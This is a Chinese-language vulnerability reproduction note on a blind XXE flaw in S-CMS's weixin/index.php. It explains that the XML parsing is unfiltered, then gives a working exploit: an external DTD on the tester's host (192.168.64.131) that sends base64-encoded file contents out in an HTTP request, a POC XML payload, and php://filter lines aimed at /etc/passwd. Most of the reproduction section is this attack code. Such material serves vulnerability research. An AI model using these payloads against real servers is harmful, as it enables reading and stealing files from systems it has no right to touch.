# S-CMS xxe漏洞

### 一、漏洞简介

### 二、漏洞影响

### 三、复现过程

漏洞分析

全局搜索simplexml，在weixin/index.php发现漏洞

![](images/15893383087501.jpg)


非常标准的XXE，没有任何过滤手段，往下并未发现有输出XML解析结果的地方，此处应用无回显的XXE攻击手段

### 漏洞复现

首先在自己的服务器（192.168.64.131）上创建一个供靶机外部引用的dtd文件（test.dtd）


```bash
<!ENTITY % all 
    "<!ENTITY &#x25; send SYSTEM 'http://192.168.64.131/?%file;'>"
>
%all;
```

发送POC


```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [
    <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=d:/phpStudy/PHPTutorial/WWW/robots.txt">
    <!ENTITY % dtd SYSTEM "http://192.168.64.131/test.dtd">
%dtd;
%send;
]>
```

![](images/15893383311020.jpg)


然后在Apache日志中查看到结果：

![](images/15893383400135.jpg)


在这里发现一个问题，查看其它php文件的内容会发生Detected an entity reference loop错误，查询资料发现libxml解析器默认限制外部实体长度为2k，无法突破，只能寻找压缩解决方案（但效果不明显）


```bash
压缩：echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd");
解压：echo file_get_contents("php://filter/read=convert.base64-decode/zlib.inflate/resource=/tmp/1");
```

**参考链接**

http://pines404.online/2019/10/31/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/S-CMS%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/